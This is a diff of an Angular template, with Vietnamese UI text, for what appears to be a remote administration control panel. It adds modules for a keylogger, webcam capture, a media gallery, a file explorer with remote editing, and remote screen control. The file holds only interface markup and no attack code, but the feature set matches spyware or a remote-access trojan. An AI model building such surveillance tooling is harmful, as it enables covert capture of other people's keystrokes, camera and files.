@@ -42,7 +42,7 @@
 
       <div><b>Status:</b> {{ ws.status() }}</div>
 
-     
+      <!-- chỗ này bạn có thể hiển thị lastMessage để debug nếu muốn -->
     </section>
 
   </div>
@@ -61,45 +61,67 @@
         <button class="module-btn" (click)="openModule('APP')">📂 APPS</button>
         <button class="module-btn" (click)="openModule('KEYLOGGER')">⌨ KEYLOGGER</button>
         <button class="module-btn" (click)="openModule('WEBCAM')">📷 WEBCAM</button>
+        <button class="module-btn" (click)="openModule('EXPLORER')">📁 EXPLORER</button>
+        <button class="module-btn" (click)="openModule('REMOTE')">🎮 REMOTE</button>
+        <button class="module-btn" (click)="openModule('GALLERY')">🎞 GALLERY</button>
       </div>
     </div>
 
     <!-- ========== PROCESS MANAGER ========== -->
-    <div *ngIf="selectedModule() === 'PROCESS'" class="section-card">
-      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+<div *ngIf="selectedModule() === 'PROCESS'" class="section-card">
+  <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
 
-      <h3 class="section-title">🔧 Process Manager</h3>
+  <h3 class="section-title">🔧 Process Manager</h3>
 
-      <div class="btn-bar">
-        <button class="btn" (click)="sendProcessList()">📋 LIST</button>
-        <button class="btn btn-danger" (click)="sendProcessKill()">🗑 KILL</button>
-        <button class="btn" (click)="sendProcessStart()">➕ START…</button>
-      </div>
+  <!-- ==== NEW INPUT ACTION BAR ==== -->
+  <div class="process-action-bar">
 
-      <table *ngIf="processList().length">
-        <thead>
-          <tr>
-            <th>PID</th>
-            <th>Name</th>
-            <th>Threads</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr *ngFor="let p of processList()">
-            <td>{{ p.pid }}</td>
-            <td>{{ p.name }}</td>
-            <td>{{ p.threads }}</td>
-            <td>
-              <button class="btn btn-danger" (click)="killProcess(p.pid)">KILL</button>
-            </td>
-          </tr>
-        </tbody>
-      </table>
+  <div class="action-group">
+    <button class="btn" (click)="sendProcessList()">📋 LIST</button>
+  </div>
 
-      <div *ngIf="!processList().length" class="placeholder">
-        Chưa có dữ liệu – bấm LIST để load thông tin.
-      </div>
+  <div class="action-group">
+    <button class="btn btn-danger" (click)="killProcess(killPid)">🗑 KILL</button>
+    <input class="input-box" type="number" placeholder="PID cần kill…" [(ngModel)]="killPid">
+  </div>
+
+  <div class="action-group">
+    <button class="btn" (click)="startProcess()">➕ START…</button>
+    <input class="input-box" type="text" placeholder="Tên process cần start..." [(ngModel)]="startExeName">
+  </div>
+
+</div>
+
+
+  <!-- ==== TABLE WITH SCROLL ==== -->
+  <div class="table-scroll">
+    <table *ngIf="processList().length">
+      <thead>
+        <tr>
+          <th>PID</th>
+          <th>Name</th>
+          <th>Threads</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let p of processList()">
+          <td>{{ p.pid }}</td>
+          <td>{{ p.exe || p.name }}</td>
+          <td>{{ p.count || p.threads }}</td>
+          <td>
+            <button class="btn btn-danger" (click)="killProcess(p.pid)">KILL</button>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div *ngIf="!processList().length" class="placeholder">
+      Chưa có dữ liệu – bấm LIST để load thông tin.
     </div>
+  </div>
+</div>
+
 
     <!-- ========== SYSTEM CONTROL ========== -->
     <div *ngIf="selectedModule() === 'SYSTEM'" class="section-card">
@@ -136,111 +158,109 @@
       </div>
     </div>
 
-    <!-- ========== APP MANAGER ========== -->
-    <div *ngIf="selectedModule() === 'APP'" class="section-card">
-      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
-      <h3 class="section-title">📂 App Manager</h3>
+<!-- ========== APP MANAGER (UNIFIED UI) ========== -->
+<div *ngIf="selectedModule() === 'APP'" class="section-card">
 
-      <div class="btn-bar">
-        <button class="btn" (click)="sendAppList()">📋 LIST</button>
-        <button class="btn" (click)="sendAppStart()">➕ START…</button>
-      </div>
+  <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
 
-      <!-- <table *ngIf="appList().length">
-        <thead>
-          <tr>
-            <th>ID</th>
-            <th>Name</th>
-            <th>Path</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr *ngFor="let a of appList()">
-          <td>{{ a.exe }}</td>
-<td>{{ a.count }}</td>
-<td>{{ a.exe }}</td>
-          </tr>
-        </tbody>
-      </table> -->
-      <table *ngIf="appList().length">
-  <thead>
-    <tr>
-      <th>NAME</th>
-      <th>ACTION</th>
-    </tr>
-  </thead>
+  <h3 class="section-title">📁 APP MANAGER</h3>
 
-  <tbody>
-    <tr *ngFor="let app of appList()">
-      <td>{{ app.exe }}</td>
+  <!-- ==== NEW UNIFIED ACTION BAR ==== -->
+  <div class="process-action-bar">
 
-      <td>
-        <button class="btn btn-danger" (click)="killApp(app.exe)">KILL</button>
-      </td>
-    </tr>
-  </tbody>
-</table>
-
-      <div *ngIf="!appList().length" class="placeholder">
-        Bấm LIST để tải danh sách ứng dụng.
-      </div>
+    <!-- LIST -->
+    <div class="action-group">
+      <button class="btn" (click)="sendAppList()">📋 LIST</button>
     </div>
+
+    <!-- KILL -->
+    <div class="action-group">
+      <button class="btn btn-danger" (click)="killApp(killExeName)">🗑 KILL</button>
+      <input class="input-box" type="text" placeholder="Tên app cần kill…" [(ngModel)]="killExeName">
+    </div>
+
+    <!-- START -->
+    <div class="action-group">
+      <button class="btn" (click)="sendAppStart()">➕ START…</button>
+      <input class="input-box" type="text" placeholder="Tên app cần start…" [(ngModel)]="startExeName">
+    </div>
+
+  </div>
+
+  <!-- ==== TABLE WITH SCROLL ==== -->
+  <div class="table-scroll" *ngIf="appList().length">
+
+    <table>
+      <thead>
+        <tr>
+          <th>EXE</th>
+          <th>PROCESS COUNT</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let app of appList()">
+          <td>{{ app.exe }}</td>
+          <td>{{ app.count }}</td>
+          <td>
+            <button class="btn btn-danger" (click)="killAppAll(app.exe)">KILL ALL</button>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+
+  </div>
+
+  <div *ngIf="!appList().length" class="placeholder">
+    Bấm LIST để tải danh sách ứng dụng.
+  </div>
+
+</div>
+
+
+
 
     <!-- ========== KEYLOGGER ========== -->
-    <div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card">
-      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+<div *ngIf="selectedModule() === 'KEYLOGGER'" class="section-card">
+  
+  <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
 
-      <h3 class="section-title">⌨ Keylogger</h3>
+  <h3 class="section-title">⌨ KEYLOGGER</h3>
 
-      <div class="btn-bar">
-        <button class="btn" (click)="sendKeyloggerStart()">Start</button>
-        <button class="btn btn-danger" (click)="sendKeyloggerStop()">Stop</button>
-        <button class="btn-blue" (click)="clearKeylogs()">CLEAR</button>
-      </div>
+  <!-- BUTTON BAR -->
+  <div class="btn-bar">
+    <button class="btn" (click)="sendKeyloggerStart()">START</button>
+    <button class="btn btn-danger" (click)="sendKeyloggerStop()">STOP</button>
+    <button class="btn" (click)="sendKeyloggerLock()">🔒 LOCK</button>
+    <button class="btn" (click)="sendKeyloggerUnlock()">🔓 UNLOCK</button>
+    <button class="btn btn-secondary" (click)="clearKeylogs()">CLEAR</button>
+  </div>
 
-      <table *ngIf="ws.keylogList().length">
-        <thead>
-          <tr>
-            <th>ID</th>
-            <th>Time</th>
-            <th>Text</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr *ngFor="let k of ws.keylogList()">
-            <td>{{ k.id }}</td>
-            <td>{{ k.timestamp }}</td>
-            <td>{{ k.text }}</td>
-          </tr>
-        </tbody>
-      </table>
-        <!-- HIỂN THỊ DẠNG TEXTAREA GIỐNG MẪU -->
-  <!-- <textarea 
-      class="keylog-textarea"
-      readonly
-      *ngIf="ws.keylogList().length">
-    {{keylogString() }}
-  </textarea> -->
-
-
-      <div *ngIf="!ws.keylogList().length" class="placeholder">
-        <!-- Chưa có log. -->
-         <div id="keylog-box" class="keylog-output">
-            Chưa có log.
-          </div>
-
-      </div>
+  <!-- TEXT LOG AREA -->
+  <div id="keylog-box" class="keylog-output">
+    <div *ngIf="ws.keylogList().length === 0" class="placeholder-text">
+      Chưa có log.
     </div>
 
-    <!-- ========== WEBCAM STREAM ========== -->
+    <!-- Gộp tất cả keylog thành văn bản -->
+    <pre class="keylog-text">
+{{ keylogText }}
+    </pre>
+  </div>
+
+</div>
+
+    <!-- ========== WEBCAM STREAM ==========
     <div *ngIf="selectedModule() === 'WEBCAM'" class="section-card">
+      <canvas #webcamCanvas hidden></canvas>
+
       <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
 
       <h3 class="section-title">📷 Webcam Stream</h3>
 
       <div class="btn-bar">
         <button class="btn" (click)="sendWebcamStartStream()">▶ Start Stream</button>
-        <button class="btn btn-danger" (click)="sendWebcamStopStream()">⏹ Stop</button>
+        <button class="btn btn-danger" (click)="sendWebcamStopStream()">⏹ Stop &amp; Save</button>
       </div>
 
       <div class="webcam-preview">
@@ -252,7 +272,222 @@
           <div class="placeholder">Không có stream.</div>
         </ng-template>
       </div>
+    </div> -->
+    <!-- WEBCAM MODULE -->
+<div *ngIf="selectedModule() === 'WEBCAM'" class="section-card">
+
+  <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+  <h3 class="section-title">📷 Webcam Stream</h3>
+
+  <div class="btn-bar">
+    <button class="btn" (click)="sendWebcamStartStream()">▶ Start Stream</button>
+    <button class="btn btn-danger" (click)="sendWebcamStopStream()">⏹ Stop & Save</button>
+  </div>
+
+  <div class="webcam-preview">
+    <img *ngIf="ws.webcamFrameUrl() as frame" [src]="frame">
+    <div *ngIf="!ws.webcamFrameUrl()" class="placeholder">Không có stream.</div>
+  </div>
+
+  <!-- CANVAS ghi video -->
+  <canvas #webcamCanvas hidden></canvas>
+</div>
+
+
+
+
+<!-- GALLERY MODULE -->
+<div *ngIf="selectedModule() === 'GALLERY'" class="section-card">
+
+  <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+  <h3 class="section-title">🎞 Gallery</h3>
+
+  <div class="btn-bar">
+    <button class="btn" (click)="reloadGallery()">↻ Reload List</button>
+  </div>
+
+  <div class="gallery-scroll">
+    <table *ngIf="ws.galleryItems().length">
+      <thead>
+        <tr>
+          <th>NAME</th>
+          <th>SIZE (KB)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr *ngFor="let g of ws.galleryItems()"
+            (click)="openGalleryItem(g)">
+          <td>{{ g.name }}</td>
+          <td>{{ g.size ? (g.size / 1024 | number:'1.1-1') : '' }}</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div *ngIf="!ws.galleryItems().length" class="placeholder">
+    Chưa có file media.
+  </div>
+
+  <!-- HIỂN THỊ MEDIA -->
+  <div *ngIf="ws.viewingFile() as file">
+  
+  <!-- VIDEO -->
+  <video *ngIf="isVideo(file.name)"
+         [src]="ws.mediaUrl()"
+         controls autoplay
+         style="max-width:100%; margin-top:15px; border-radius:8px;">
+  </video>
+
+  <!-- IMAGE -->
+  <img *ngIf="isImage(file.name)"
+       [src]="ws.mediaUrl()"
+       style="max-width:100%; margin-top:15px; border-radius:8px;">
+   
+  </div>
+</div>
+
+
+    <!-- ========== EXPLORER ========== -->
+    <div *ngIf="selectedModule() === 'EXPLORER'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">📁 Explorer</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="explorerGoRoot()">My Computer</button>
+        <button class="btn" (click)="explorerRefresh()">Refresh</button>
+        <button class="btn" (click)="explorerBack()">⬅ Back</button>
+      </div>
+
+      <div style="font-size:11px; margin-bottom:4px;">
+        Current path:
+        <span>{{ currentExplorerPath() || 'ROOT' }}</span>
+      </div>
+
+      <!-- <table *ngIf="explorerItems().length">
+        <thead>
+          <tr>
+            <th>TYPE</th>
+            <th>NAME</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let item of explorerItems()" (dblclick)="explorerOpen(item)">
+            <td>{{ item.type }}</td>
+            <td>{{ item.name }}</td>
+          </tr>
+        </tbody>
+      </table> -->
+      <div class="explorer-grid" *ngIf="explorerItems().length">
+        <div class="explorer-item"
+          *ngFor="let item of explorerItems()"
+           (dblclick)="onExplorerItemDblClick(item)">
+
+           <div class="icon-emoji">{{ getExplorerIcon(item) }}</div>
+           <div class="label">{{ item.name }}</div>
+
+        </div>
+      </div>
+
+
+      <div *ngIf="!explorerItems().length" class="placeholder">
+        Bấm "My Computer" để tải danh sách ổ đĩa / thư mục.
+      </div>
     </div>
+
+    <!-- ========== REMOTE CONTROL ========== -->
+    <div *ngIf="selectedModule() === 'REMOTE'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">🎮 Remote Control</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="toggleRemote()">
+          {{ remoteActive() ? '⏹ Stop Remote' : '▶ Start Remote' }}
+        </button>
+      </div>
+
+      <div class="screen-preview">
+        <ng-container *ngIf="screenshot() as shot; else noRemoteShot">
+          <img
+            [src]="shot"
+            alt="Remote Screen"
+            (mousemove)="onRemoteMouseMove($event)"
+            (mousedown)="onRemoteMouseDown($event)"
+            (mouseup)="onRemoteMouseUp($event)"
+            (wheel)="onRemoteWheel($event)"
+            (contextmenu)="onRemoteContextMenu($event)"
+          />
+        </ng-container>
+
+        <ng-template #noRemoteShot>
+          <div class="placeholder">Chưa có frame remote. Bấm Start Remote.</div>
+        </ng-template>
+      </div>
+    </div>
+    <!-- ============================================================
+     ⭐ REMOTE FILE EDITOR MODAL — HIỆN KHI MỞ FILE TRONG EXPLORER
+=============================================================== -->
+<div class="editor-backdrop" *ngIf="editorOpen()" (click)="closeEditor()"></div>
+
+<div class="editor-modal" *ngIf="editorOpen()">
+  
+  <div class="editor-header">
+    <div class="editor-title">
+      ✏️ Editing: {{ editorPath() }}
+    </div>
+
+    <div class="editor-buttons">
+      <button class="btn-save" (click)="saveEditorFile()">💾 Save</button>
+      <button class="btn-close" (click)="closeEditor()">✖ Close</button>
+    </div>
+  </div>
+
+  <textarea
+    class="editor-textarea"
+    [value]="editorContent()"
+    (input)="updateEditorText($event)"
+    spellcheck="false"
+  ></textarea>
+
+</div>
+
+
+    <!-- ========== GALLERY ==========
+    <div *ngIf="selectedModule() === 'GALLERY'" class="section-card">
+      <button class="btn btn-secondary" (click)="backToModules()">← Modules</button>
+
+      <h3 class="section-title">🎞 Gallery</h3>
+
+      <div class="btn-bar">
+        <button class="btn" (click)="reloadGallery()">↻ Reload List</button>
+      </div>
+
+      <table *ngIf="galleryItems().length">
+        <thead>
+          <tr>
+            <th>NAME</th>
+            <th>SIZE (KB)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let g of galleryItems()" (click)="openGalleryItem(g)">
+            <td>{{ g.name }}</td>
+            <td>
+              {{
+                g.size
+                  ? ((g.size / 1024) | number:'1.1-1')
+                  : ''
+              }}
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div *ngIf="!galleryItems().length" class="placeholder">
+        Chưa có file media – hãy stream và lưu video trước.
+      </div>
+    </div> -->
 
   </section>
 
